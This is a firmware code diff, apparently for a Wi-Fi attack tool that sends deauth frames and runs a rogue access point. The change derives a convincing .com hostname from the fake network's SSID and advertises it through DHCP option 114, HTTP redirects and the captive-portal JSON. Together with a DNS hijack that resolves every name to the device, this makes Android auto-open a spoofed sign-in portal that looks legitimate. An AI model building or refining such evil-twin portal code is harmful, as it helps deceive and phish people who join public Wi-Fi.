@@ -91,6 +91,30 @@ bool secured=false;
 //"00:E0:4C:01:02:03"
 __u8 customMac[8]={0x00,0xE0,0x4C,0x01,0x02,0x03,0x00,0x00};
 bool useCustomMac=false;
+// Captive-portal host: a NAME derived from the AP SSID ("Free_Wifi" -> freewifi.com) so
+// the portal is served as http://<host>/ instead of a bare IP. The DNS hijack resolves
+// <host> (and every other name) to the AP, so DHCP option 114, the 302 Location and
+// /cp.json all advertise this host.
+char portalHost[64] = "portal.com";
+char portalUrl[80]  = "http://portal.com/";
+char cpUri[96]      = "http://portal.com/cp.json";
+
+void build_portal_urls(const char* ssid){
+  char s[48]; int n = 0;
+  for (int i = 0; ssid && ssid[i] && n < 47; i++) {
+    char c = ssid[i];
+    if (c >= '0' && c <= '9')      s[n++] = c;
+    else if (c >= 'a' && c <= 'z') s[n++] = c;
+    else if (c >= 'A' && c <= 'Z') s[n++] = (char)(c - 'A' + 'a');
+    // drop spaces, underscores, dots and anything else that is not [a-z0-9]
+  }
+  s[n] = 0;
+  if (n == 0) strcpy(s, "portal");
+  snprintf(portalHost, sizeof(portalHost), "%s.com", s);
+  snprintf(portalUrl,  sizeof(portalUrl),  "http://%s/", portalHost);
+  snprintf(cpUri,      sizeof(cpUri),      "http://%s/cp.json", portalHost);
+  Serial.print("PORTAL host: "); Serial.println(portalHost);
+}
 //int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11};
 extern u8 rtw_get_band_type(void);
 #define FRAMES_PER_DEAUTH 5
@@ -187,7 +211,7 @@ void createAP(char* ssid, char* channel, char* password){
   // Replace the SDK DHCP server with ours so we can advertise option 114 (RFC 8910),
   // which is what actually triggers Android 11+ captive-portal auto-open.
   dhcps_deinit();
-  start_DHCP_Server();
+  start_DHCP_Server(cpUri);
 
   unbind_dns();
   delay(1000);
@@ -272,7 +296,7 @@ String makeResponse(int code, String content_type, bool compresed, size_t conten
 // "Sign in to network" flow. Stock 5Ghost uses exactly this; DHCP option 114 is NOT needed.
 void handleRedirect(WiFiClient &client) {
   String response = "HTTP/1.1 302 Found\r\n";
-  response += "Location: http://192.168.4.1/\r\n";
+  response += "Location: " + String(portalUrl) + "\r\n";
   response += "Content-Length: 0\r\n";
   response += "Cache-Control: no-store\r\n";
   response += "Connection: close\r\n\r\n";
@@ -959,6 +983,7 @@ void loop() {
       
       String ap_ssid = readString.substring(8,readString.length()-1);
       ap_ssid.toCharArray(ssid, 33);
+      build_portal_urls(ssid);   // portal host derives from the AP name (before createAP)
       if(secured){
         createAP(ssid, ap_channel,wpa_pass);
       }else{
@@ -1707,7 +1732,7 @@ void loop() {
             // Android's NetworkMonitor fetches this expecting application/captive+json.
             // Report captive:false once this client is authorized so the OS clears the warning.
             if(path.startsWith("/cp.json")){
-              String j = String("{\"captive\":") + (authed ? "false" : "true") + ",\"user-portal-url\":\"http://192.168.4.1/\"}";
+              String j = String("{\"captive\":") + (authed ? "false" : "true") + ",\"user-portal-url\":\"" + String(portalUrl) + "\"}";
               String resp = makeResponse(200, "application/captive+json", false, j.length());
               resp += j;
               client.write(resp.c_str());
